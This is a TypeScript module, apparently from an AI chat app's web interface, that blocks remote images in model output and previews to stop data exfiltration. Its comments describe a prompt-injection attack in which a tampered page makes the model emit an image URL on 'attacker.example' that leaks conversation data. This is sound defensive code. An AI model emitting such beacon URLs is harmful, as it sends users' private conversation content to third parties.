/**
 * Remote images in model output are an exfiltration beacon: a prompt-injected
 * page or file can make the model emit `![](https://attacker.example/?d=...)`
 * and the browser fetches it with no user action (gptme/gptme#5223).
 *
 * So a remote image is not loaded until the user asks for it. Same-origin,
 * relative, `data:` and `blob:` URLs render directly — they cannot hand
 * conversation content to a third party.
 */

export const REMOTE_IMAGE_PLACEHOLDER_CLASS = 'remote-image-placeholder';

/**
 * CSP for HTML previews rendered in a sandboxed iframe: a model-authored
 * `<img src>` (or a CSS `background-image`) must not fetch a remote host.
 */
export const PREVIEW_IMAGE_CSP = "img-src 'self' data: blob:";

function pageUrl(): string {
  return typeof window !== 'undefined' ? window.location.href : 'http://localhost';
}

/** True when loading `url` would send a request to another origin. */
export function isRemoteImageUrl(url: string, page: string = pageUrl()): boolean {
  try {
    // Hand the raw string to the URL parser, which is what the browser runs on
    // `src`: it strips leading/trailing C0 controls and spaces, drops
    // tabs/newlines and reads `\` as `/`. A pre-check that normalizes any less
    // than the parser does is a bypass.
    const base = new URL(page);
    const parsed = new URL(url, base);
    // `data:`, `blob:` and app-scheme URLs send nothing to a third party.
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
    return parsed.origin !== base.origin;
  } catch {
    // An unparseable URL is treated as remote: fail closed.
    return true;
  }
}

function imageSourceLabel(src: string): string {
  try {
    return new URL(src, pageUrl()).host;
  } catch {
    return 'remote host';
  }
}

/**
 * Placeholder shown instead of a remote image. It carries no `src`, so the
 * browser makes no request; clicking swaps in the real `<img>`.
 */
export function createRemoteImagePlaceholder(src: string): HTMLButtonElement {
  const button = document.createElement('button');
  button.type = 'button';
  button.className = REMOTE_IMAGE_PLACEHOLDER_CLASS;
  button.dataset.remoteSrc = src;
  button.title = src;
  button.textContent = `Remote image from ${imageSourceLabel(src)} — click to load`;
  button.setAttribute('aria-label', `Load remote image from ${imageSourceLabel(src)}`);
  button.addEventListener('click', (event) => {
    // A linked image must only load: the click must not also open the link.
    event.preventDefault();
    const img = document.createElement('img');
    img.setAttribute('src', src);
    img.setAttribute('alt', '');
    button.replaceWith(img);
  });
  return button;
}

/**
 * Wrap model-authored HTML for the preview iframe with a document-level CSP
 * that blocks remote image loads. The preview is model output too, so an
 * `<img src="https://attacker.example/?d=...">` inside an HTML fence would
 * otherwise beacon even though it is never clicked.
 */
export function htmlPreviewSrcDoc(html: string): string {
  return `<!doctype html><meta http-equiv="Content-Security-Policy" content="${PREVIEW_IMAGE_CSP}">${html}`;
}
